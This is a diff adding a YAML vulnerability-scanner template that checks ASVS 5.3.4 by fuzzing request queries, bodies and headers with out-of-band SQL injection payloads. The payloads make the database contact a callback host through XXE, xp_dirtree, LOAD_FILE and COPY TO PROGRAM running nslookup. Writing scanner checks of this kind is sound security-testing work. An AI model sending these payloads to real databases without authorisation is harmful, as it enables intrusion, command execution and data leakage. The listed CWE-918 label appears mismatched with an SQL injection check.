@@ -1,0 +1,52 @@
+id: ASVS-4-0-3-V5-3-4
+
+info:
+  name: ASVS 5.3.4 Check
+  author: AmirHossein Raeisi,snoopy
+  severity: critical
+  classification:
+    cwe-id: CWE-918
+  reference:
+    - https://portswigger.net/web-security/sql-injection/cheat-sheet
+  tags: asvs,5.3.4
+  description: |
+    Verify that data selection or database queries (e.g. SQL, HQL, ORM, NoSQL) use parameterized queries, ORMs, entity frameworks, or are otherwise protected from database injection attacks.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method != "OPTIONS"'
+
+    payloads:
+      sqli:
+        - "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"{{interactsh-url}}\"> %remote;]>'),'/l') FROM dual--"
+        - "SELECT UTL_INADDR.get_host_address('{{interactsh-url}}')--"
+        - "'; exec master..xp_dirtree '//{{interactsh-url}}/a'--"
+        - "copy (SELECT '') to program 'nslookup {{interactsh-url}}'--"
+        - "LOAD_FILE('\\\\{{interactsh-url}}\\a')-- -"
+        - "SELECT ... INTO OUTFILE '\\\\{{interactsh-url}}\a'-- -"
+
+    fuzzing:
+      - parts:
+          - query
+          - body
+          - header
+        type: postfix
+        mode: single
+        fuzz:
+          - "' UNION {{sqli}}"
+          - "\" UNION {{sqli}}"
+          - "' AND 1={{sqli}}"
+          - "\" AND 1={{sqli}}"
+          - " {{sqli}}"
+
+
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+# digest: 4a0a004730450220632cd0002707fa5eeab5d7da85b3d6df805fb7bdd3a08ab2a39dafd607838f0502210095b1a397d2139214ae6eb25d742841f7656107457299fe89dde949eb0fb64bc2:236a7c23afe836fbe231d6e037cff444
